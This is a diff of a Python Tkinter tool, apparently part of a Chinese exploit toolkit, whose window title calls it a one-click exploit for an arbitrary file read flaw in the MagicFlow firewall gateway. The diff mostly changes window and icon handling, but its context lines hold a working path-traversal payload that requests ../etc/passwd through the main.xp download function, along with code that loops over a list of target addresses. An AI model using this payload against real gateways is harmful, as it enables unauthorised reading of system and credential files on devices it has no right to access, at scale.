@@ -2,6 +2,8 @@ import requests
 import tkinter as tk
 from tkinter import scrolledtext
 from concurrent.futures import ThreadPoolExecutor
+from tkinter import *
+from PIL.ImageTk import PhotoImage
 from ttkbootstrap.constants import *
 def magicflow_readfile_exp(url):
     poc = r"""/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd"""
@@ -25,11 +27,12 @@ def get_magicflow_readfile_addr():
             address = address.strip()
             yield address
 def magicflow_readfile_gui():
-    magicflow_readfile = tk.Tk()
-    magicflow_readfile.geometry("910x450")
+    magicflow_readfile = Toplevel()
+    magicflow_readfile.geometry("1035x455")
     magicflow_readfile.title("MagicFlow 防火墙网关 main.xp 任意文件读取漏洞一把梭")
     magicflow_readfile.resizable(0, 0)
-    magicflow_readfile.iconbitmap('logo.ico')
+    logo = PhotoImage(file="./logo.ico")
+    magicflow_readfile.tk.call('wm', 'iconphoto', magicflow_readfile._w, logo)
     global magicflow_readfile_text
     magicflow_readfile_text = scrolledtext.ScrolledText(magicflow_readfile,width=123, height=25)
     magicflow_readfile_text.grid(row=0, column=0, padx=10, pady=10)
